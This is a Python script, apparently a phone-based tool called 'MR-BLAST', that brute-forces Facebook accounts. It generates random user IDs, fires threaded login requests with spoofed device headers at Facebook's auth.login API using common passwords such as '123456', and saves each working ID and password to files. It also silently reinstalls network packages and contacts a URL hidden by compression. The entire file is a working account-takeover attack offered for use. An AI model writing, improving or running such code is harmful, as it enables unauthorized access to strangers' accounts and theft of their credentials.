#▬▭▬▭▬▭▬▭[IMPORT]▬▭▬▭▬▭▬▭#
import uuid,base64,os,hashlib,zlib,subprocess,time,platform,requests
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib,marshal,zlib,base64
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import _socket, ssl, certifi
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from io import BytesIO
import datetime
from urllib.parse import urlencode
os.system("clear");os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip uninstall pycurl -y && pip install pycurl');os.system("clear")
import pycurl
#▬▭▬▭▬▭▬▭[COLOR CODE]▬▭▬▭▬▭▬▭#
white= "\x1b[1;97m";yelloww="\033[1;33m";green = "\x1b[38;5;49m";G0 = "\x1b[38;5;155m";green1 = '\x1b[38;5;154m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';G6 = "\x1b[38;5;52m";s = "\033[0m";W = "\033[1;30m";Y = "\x1b[1;93m";red = "\x1b[38;5;160m";B = "\033[1;95m";BE = "\x1b[1;35m";X = "\x1b[1;96m";Z = "\x1b[1;95m";Y = "\033[1;93m";U = "\033[1;94m";V = "\033[38;5;47m";T = "\033[38;5;48m";Q = "\033[38;5;49m";P = "\033[38;5;50m";O = "\033[38;5;51m";N = "\033[38;5;52m";M = "\x1b[38;5;205m";L = "\033[96;1m";K = "\x1b[1;91m";WH = "\033[1;97m";orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";rad="\x1b[38;5;160m";YLW="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
style=f"{white}[{red}●{white}]"
#▬▭▬▭▬▭▬▭[PYCURL]▬▭▬▭▬▭▬▭#
def py_curl(url):
    curl = pycurl.Curl()
    buffer = BytesIO()
    try:
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.SSL_VERIFYPEER, 1)
        curl.setopt(curl.SSL_VERIFYHOST, 2)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
    except pycurl.error as e:
        return f"An error in py{e}"
    finally:
        curl.close()
    response_body = buffer.getvalue().decode('utf-8')
    return response_body
#▬▭▬▭▬▭▬▭[LOADING SYSTEM]▬▭▬▭▬▭▬▭#
def BLAST(z):
      for a in z +'\n':sys.stdout.write(a);sys.stdout.flush();time.sleep(0.050)
#▬▭▬▭▬▭▬▭[OPENING MOMENT]▬▭▬▭▬▭▬▭#
print(f'{style}{green} Checking Update...{white}');time.sleep(2)
# os.system("git pull");# os.system("xdg-open https://t.me/trickerxx77");time.sleep(2);#os.system("clear")
#▬▭▬▭▬▭▬▭[MODULE]▬▭▬▭▬▭▬▭#
try:import pystyle
except ImportError:print(f"{style} {green}installing pystyle...{white}");time.sleep(0.5);os.system('pip install pystyle');import pystyle;os.system('clear')
from pystyle import Colors, Colorate
#▬▭▬▭▬▭▬▭[USER AGENT]▬▭▬▭▬▭▬▭#
def BLAST_ua():
    ver=str(random.choice(range(77,500)))
    ver2=str(random.choice(range(57,77)))
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"
#▬▭▬▭▬▭▬▭[SPECIAL LINE]▬▭▬▭▬▭▬▭#
def linex():
    #print(Colorate.Horizontal(Colors.green_to_white, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
    print(f"{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#▬▭▬▭▬▭▬▭[TOOL VERSION]▬▭▬▭▬▭▬▭#
try:
    versionn = py_curl(zlib.decompress(b'x\x9c\x05\xc1\xb1\n\x80 \x10\x00\xd0/\xd2kpj\x8bh*\x13\xc4=\xcc$\x85<C\xcf\xea\xf3{/\x10\xdd\xb5\x07(\xf6\xe5g\xa4\xd0\xf6V}q\x19\xc9#q\x97\x13H\xcd\xcc\xa0\xa7\x99\x89N\xc0\xa8V\xa3\xd5\xc2\xb4R\x12\x92\x8d\x08\xf9:\xb6\xc7\x97\x1a3r\xfa\xe8\x07{^\x1c\x14'))
except Exception as e:print(f'{green} An error occurred: {e}');sys.exit()
version = versionn.strip()
#▬▭▬▭▬▭▬▭[BANNER]▬▭▬▭▬▭▬▭#
logo=(Colorate.Horizontal(Colors.green_to_white, """
▗▄▄▖ ▗▖    ▗▄▖  ▗▄▄▖▗▄▄▄▖
▐▌ ▐▌▐▌   ▐▌ ▐▌▐▌     █  
▐▛▀▚▖▐▌   ▐▛▀▜▌ ▝▀▚▖  █  
▐▙▄▞▘▐▙▄▄▖▐▌ ▐▌▗▄▄▞▘  █ """" MR-BLAST"))
info=(f"""{style}{green} AUTHOR {white}➤ {green}RUSTAP CHAUDHARY
{style}{green} STATUS   {white}➤ {green}{version}
{style}{green} GITHUB   {white}➤ {green}github.com/Jynx-Star""")
def main_logo():
    os.system("clear");print(logo);linex();print(info);linex()
#▬▭▬▭▬▭▬▭[LOPP]▬▭▬▭▬▭▬▭#
oks,loop,ua,ussr,tw,cps=[],0,[],[],[],[]
#▬▭▬▭▬▭▬▭[MAIN MENU]▬▭▬▭▬▭▬▭#
def main():
    main_logo()
    print(f'{white}[{red}A{white}]{green} START 2011-14 CLONE')
    print(f'{white}[{red}B{white}]{green} START 2009-10 CLONE')
    print(f'{white}[{red}C{white}]{green} JOIN PUBLIC GROUP')
    print(f'{white}[{red}O{white}]{green} EXIT THIS PROGRAM')
    linex()
    year_select = input(f'{white}[{red}?{white}] {green}SELECT {white}▶︎ {green}')
    if year_select in ['A','a','01','1']:old_2011_2014()
    elif year_select in ['B','b','02','2']:old_2009_2010()
    elif year_select in ['c','C','03','3']:os.system("xdg-open https://t.me/trickerxx77");main()
    elif year_select in ['6','f','06','F']:os.system("xdg-open https://t.me/trickerxx77");old_2008()
    elif year_select in ['O','o','00','0']:os.system("xdg-open https://t.me/trickerxx77");os.system("exit")
    else:main()
#▬▭▬▭▬▭▬▭[OLD MENU]▬▭▬▭▬▭▬▭#
def old_2011_2014():
    user=[]
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 10000 20000 50000 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    year_code="10000";clone_system="2011-2014"
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y}-{red}[{white}M1{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y}-{red}[{white}M2{red}]')
    linex()
    method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for i in range(limit):
        data=str(random.choice(range(1000000000,9999999999)));user.append(data)
    tl = str(len(user))
    with ThreadPool(max_workers=40) as mr_BLAST:
        main_logo()
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {str(len(user))}'+f'{red} ┼{green} SERVER{cyan} »{white} {clone_system}');print(f'{style}{green} ID LOGIN APTER 3 DAYS FOR GOOD RESULT')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for mal in user:
            uid=year_code+mal
            if method in ["01","1","A","a"]:mr_BLAST.submit(_method_A_,uid,user)
            elif method in ["02","2","B","b"]:mr_BLAST.submit(_method_B_,uid,user)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}");linex();exit()
#▬▭▬▭▬▭▬▭[OLD MENU]▬▭▬▭▬▭▬▭#
def old_2009_2010():
    user=[]
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 10000 20000 50000 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    year_code="100000";clone_system="2009-2010"
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y}-{red}[{white}M1{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y}-{red}[{white}M2{red}]')
    linex()
    method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for i in range(limit):
        data=str(random.choice(range(100000000,999999999)));user.append(data)
    tl = str(len(user))
    with ThreadPool(max_workers=40) as mr_BLAST:
        main_logo()
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {str(len(user))}'+f'{red} ┼{green} SERVER{cyan} »{white} {clone_system}');print(f'{style}{green} ID LOGIN APTER 3 DAYS FOR GOOD RESULT')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for mal in user:
            uid=year_code+mal
            if method in ["01","1","A","a"]:mr_BLAST.submit(_method_A_,uid,user)
            elif method in ["02","2","B","b"]:mr_BLAST.submit(_method_B_,uid,user)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}");linex();exit()
#▬▭▬▭▬▭▬▭[OLD MENU]▬▭▬▭▬▭▬▭#
def old_2008():
    user=[]
    main_logo()
    print(f'{style}{green} EXAMPLE {white}: {green} 10000 20000 50000 99999');linex()
    limit = int(input(f"{style} {green}ENTER LIMITS {white}▶︎ {green}"))
    year_code="3";clone_system="2009-2010"
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y}-{red}[{white}M1{red}]')
    print(f'{white}[{red}B{white}]{green} METHOD{Y}-{red}[{white}M2{red}]')
    linex()
    method= input(f"{white}[{red}?{white}]{green} SELECT {white}▶︎ ")
    for i in range(limit):
        data=str(random.choice(range(1000000,9999999)));user.append(data)
    tl = str(len(user))
    with ThreadPool(max_workers=40) as mr_BLAST:
        main_logo()
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {str(len(user))}'+f'{red} ┼{green} SERVER{cyan} »{white} {clone_system}');print(f'{style}{green} ID LOGIN APTER 3 DAYS FOR GOOD RESULT')
        print(f'{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN');linex()
        for mal in user:
            uid=year_code+mal
            if method in ["01","1","A","a"]:mr_BLAST.submit(_method_A_,uid,user)
            elif method in ["02","2","B","b"]:mr_BLAST.submit(_method_B_,uid,user)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}");linex();exit()
#▬▭▬▭▬▭▬▭[METHOD 1]▬▭▬▭▬▭▬▭#
def _method_A_(uid,user):
    global oks,loop 
    agent = BLAST_ua()
    try:
        sys.stdout.write(f'\r\r{rad}[{green}FINDING-M1{rad}]{white}~{rad}[\x1b[1;97m{loop}{rad}]{white}~{rad}[{green1}CREAKED{white}•{green}{len(oks)}{rad}]');sys.stdout.flush()       
        #for pw in ['১২৩৪৫৬','bangladesh','506070','mimmim','sabbir','i love you','Bangladesh','@@@###','jannat','bangla','506070']:
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": agent,
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            mtd_A=requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in mtd_A:
                oks.append(uid)
                print(f"\r\r{red}[{green1}SUCCESS{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/MR-BLAST-OLD-M1--OK.txt","a").write(uid+"|"+pw+"\n")
                break 
            elif "Please Confirm Email" in str(mtd_A):
                oks.append(uid)
                print(f"\r\r{red}[{green1}SUCCESS{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/MR-BLAST-OLD-M1-OKK.txt","a").write(uid+"|"+pw+"\n")
                break
            else:continue
        loop+=1
    except Exception as e:
        time.sleep(20)
#▬▭▬▭▬▭▬▭[METHOD 2]▬▭▬▭▬▭▬▭#
def _method_B_(uid,user):
    global oks,loop 
    Session=requests.session();agent = BLAST_ua()
    ua=f"Dalvik/2.1.0 (Linux; U; Android 11; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/"+str(random.randint(410,450))+".0.0."+str(random.randint(1,9))+"."+str(random.randint(50,110))+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+str(random.randint(410000000,499999999))+";FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-A326U;FBSV/4.4.2;FBCA/arm64-v8a:null;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/0;]"
    try:
        sys.stdout.write(f'\r\r{rad}[{green}FINDING{white}-{green}M2{rad}]{white}~{rad}[\x1b[1;97m{loop}{rad}]{white}~{rad}[{green1}CREAKED{white}•{green}{len(oks)}{rad}]');sys.stdout.flush()       
        #for pw in ['১২৩৪৫৬','bangladesh','506070','mimmim','sabbir','i love you','Bangladesh','@@@###','jannat','bangla','506070']:
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": agent,
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            mtd_B=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in mtd_B:
                oks.append(uid)
                print(f"\r\r{red}[{green1}SUCCESS{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/MR-BLAST-OLD-M2-OK.txt","a").write(uid+"|"+pw+"\n")
                break 
            elif "Please Confirm Email" in str(mtd_B):
                oks.append(uid)
                print(f"\r\r{red}[{green1}SUCCESS{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/MR-BLAST-OLD-M2-OKK.txt","a").write(uid+"|"+pw+"\n")
                break
            else:continue
        loop+=1
    except Exception as e:
        time.sleep(20)


main()